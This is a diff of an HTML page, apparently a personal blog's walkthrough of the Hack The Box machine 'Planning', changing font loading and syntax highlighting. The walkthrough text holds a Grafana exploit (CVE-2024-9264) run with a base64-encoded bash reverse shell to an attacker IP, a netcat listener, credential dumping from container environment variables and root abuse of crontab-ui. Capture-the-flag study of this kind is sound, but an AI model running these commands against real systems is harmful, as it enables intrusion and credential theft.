@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -89,7 +95,7 @@
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ ffuf -H &quot;Host: FUZZ.planning.htb&quot; -w dns-Jhaddix.txt \
+<pre class="wp-term-body"><code class="hljs language-bash">$ ffuf -H <span class="hljs-string">&quot;Host: FUZZ.planning.htb&quot;</span> -w dns-Jhaddix.txt \
     -u http://planning.htb -fs 178 -t 1000
 grafana [Status: 302, Size: 29]</code></pre>
 </div>
@@ -108,21 +114,21 @@ grafana [Status: 302, Size: 29]</code></pre>
 <div class="wp-stage-body"><p>Public exploit <code>nollium/CVE-2024-9264</code> does the whole thing:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
-    -c &#39;echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash&#39; \
-    &quot;http://grafana.planning.htb/&quot;
-[*] Logged in as admin
-[*] Executing command: echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash</code></pre>
+<pre class="wp-term-body"><code class="hljs language-bash">$ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
+    -c <span class="hljs-string">&#x27;echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash&#x27;</span> \
+    <span class="hljs-string">&quot;http://grafana.planning.htb/&quot;</span>
+[*] Logged <span class="hljs-keyword">in</span> as admin
+[*] Executing <span class="hljs-built_in">command</span>: <span class="hljs-built_in">echo</span> c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | <span class="hljs-built_in">base64</span> -d | bash</code></pre>
 </div>
 
 
 <p>Listener catches a shell — and it&#39;s root:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · root@container</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 4444
+<pre class="wp-term-body"><code class="hljs language-bash">$ nc -lvnp 4444
 connect to [10.10.16.83] from (UNKNOWN) [10.10.11.68] 46788
-# id
-uid=0(root) gid=0(root) groups=0(root)</code></pre>
+<span class="hljs-comment"># id</span>
+uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)</code></pre>
 </div>
 
 
@@ -138,10 +144,10 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
 <h2 class="wp-stage-title">The container&#39;s <code>env</code> is a password vault.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · root@grafana-container</span></div>
-<pre class="wp-term-body"><code class="language-bash"># env
+<pre class="wp-term-body"><code class="hljs language-bash"><span class="hljs-comment"># env</span>
 GF_SECURITY_ADMIN_PASSWORD=[REDACTED]
 GF_PATHS_PROVISIONING=/etc/grafana/provisioning
-GF_AUTH_AnonymousEnabled=false</code></pre>
+GF_AUTH_AnonymousEnabled=<span class="hljs-literal">false</span></code></pre>
 </div>
 
 
@@ -151,7 +157,7 @@ GF_AUTH_AnonymousEnabled=false</code></pre>
 <p>Grabbing <code>/etc/passwd</code> on the host via LFI was unnecessary — <code>ssh enzo@planning.htb</code> with the <code>GF_SECURITY_ADMIN_PASSWORD</code> just works:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · enzo@planning</span></div>
-<pre class="wp-term-body"><code class="language-bash">enzo@planning:~$ cat user.txt
+<pre class="wp-term-body"><code class="hljs language-bash">enzo@planning:~$ <span class="hljs-built_in">cat</span> user.txt
 [FLAG]</code></pre>
 </div>
 
@@ -170,13 +176,13 @@ GF_AUTH_AnonymousEnabled=false</code></pre>
 <h2 class="wp-stage-title">linpeas flags a crontab.db, crontab-ui wants the same password.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · enzo@planning</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ linpeas.sh | tee /tmp/pe.log
+<pre class="wp-term-body"><code class="hljs language-bash">$ linpeas.sh | <span class="hljs-built_in">tee</span> /tmp/pe.log
 [+] Searching tables inside readable .db/.sql/.sqlite files
 Found /opt/crontabs/crontab.db: New Line Delimited JSON text data
 
-$ cat /opt/crontabs/crontab.db
-{&quot;name&quot;:&quot;GrafanaBackup&quot;,&quot;command&quot;:&quot;/usr/bin/docker save root_grafana ...&quot;,
- &quot;schedule&quot;:&quot;@daily&quot;,&quot;created&quot;:&quot;1740872983270&quot;,...}
+$ <span class="hljs-built_in">cat</span> /opt/crontabs/crontab.db
+{<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;GrafanaBackup&quot;</span>,<span class="hljs-string">&quot;command&quot;</span>:<span class="hljs-string">&quot;/usr/bin/docker save root_grafana ...&quot;</span>,
+ <span class="hljs-string">&quot;schedule&quot;</span>:<span class="hljs-string">&quot;@daily&quot;</span>,<span class="hljs-string">&quot;created&quot;</span>:<span class="hljs-string">&quot;1740872983270&quot;</span>,...}
 $ ss -tuln
 LISTEN  127.0.0.1:8000
 LISTEN  127.0.0.1:3000</code></pre>
@@ -190,12 +196,12 @@ LISTEN  127.0.0.1:3000</code></pre>
 <p>Add a one-shot job that copies the flag and relaxes its permissions:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">crontab-ui · root</span></div>
-<pre class="wp-term-body"><code class="language-bash">Name:     pwn
-Command:  cp /root/root.txt /home/enzo/ &amp;&amp; chmod 777 /home/enzo/root.txt
+<pre class="wp-term-body"><code class="hljs language-bash">Name:     pwn
+Command:  <span class="hljs-built_in">cp</span> /root/root.txt /home/enzo/ &amp;&amp; <span class="hljs-built_in">chmod</span> 777 /home/enzo/root.txt
 Schedule: * * * * *
 [Run now]
 
-$ cat /home/enzo/root.txt
+$ <span class="hljs-built_in">cat</span> /home/enzo/root.txt
 [FLAG]</code></pre>
 </div>
 
@@ -229,9 +235,6 @@ $ cat /home/enzo/root.txt
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
